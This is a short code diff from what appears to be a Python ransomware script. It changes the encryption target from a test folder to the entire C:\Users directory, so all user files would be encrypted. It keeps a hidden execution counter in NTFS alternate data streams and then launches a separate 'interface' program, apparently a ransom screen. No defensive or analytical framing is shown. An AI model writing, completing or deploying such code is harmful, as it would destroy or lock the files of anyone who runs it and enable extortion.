@@ -188,7 +188,7 @@ def file_encrypt(files, key):
         pass
 
 
-base_directory = r"C:\Users\Lenovo\OneDrive\Desktop\encrypt"
+base_directory = r"C:\Users"
 allfiles1.searching_files(base_directory)
 files = allfiles1.file_list
 
@@ -200,12 +200,11 @@ if executions != 2:
 
     file_encrypt(files, key)
 time.sleep(5)
-subprocess.run(["python3", "interface.py"])
+subprocess.run(["interface"])
 
-executions = read_executions_from_ads(file_path_ads)
-        if executions != 2:
-            executions=2
-            write_executions_to_ads(file_path_ads, executions)
+    if executions != 2:
+        executions=2
+        write_executions_to_ads(file_path_ads, executions)
 #open_video(video)
 '''
 
